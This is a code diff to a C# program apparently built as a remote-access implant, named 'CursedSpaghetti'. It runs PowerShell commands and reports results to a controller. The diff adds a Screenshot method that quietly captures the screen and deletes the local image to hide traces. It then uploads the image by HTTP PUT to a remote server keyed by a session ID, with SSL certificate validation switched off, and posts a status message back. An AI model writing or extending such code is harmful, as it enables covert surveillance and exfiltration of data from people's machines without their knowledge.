@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
+using System.Net;
 using System.Text;
 using System.Text.RegularExpressions;
 
@@ -112,6 +113,39 @@ namespace CursedSpaghetti
                 return (output.ToString(), error);
             }
             return ("!#!WARNING: Interactive Command Detected! CliProtection Triggered", "");
+        }
+
+        // Take Screenshot
+        public void Screenshot(string fs_url, string url, string sessionid, string location)
+        {
+            string output = "";
+            String filename = String.Concat(Utilities.GetTimestamp(DateTime.Now), ".png");
+            Utilities.takeScreenShot(location, filename);
+            byte[] content = Utilities.FileToByte(location, filename);
+
+            // Delete image file
+            File.Delete(String.Format("{0}/{1}", location, filename));
+
+            if (content.Length == 0)
+            {
+                output = "#!#Screenshot failed";
+            }
+            else
+            {
+                using (var client = new WebClient())
+                {
+                    // Ignore SSL Certificate errors
+                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+
+                    client.Headers.Add("Session-Id", sessionid);
+                    client.Headers.Add("File-Name", filename);
+                    client.UploadData(fs_url, "PUT", content);
+
+                    output = String.Format("!#! -- Success --\r\nScreenshot saved as {0}", filename);
+                }
+            }
+
+            Utilities.Post(url, output);
         }
     }
 }
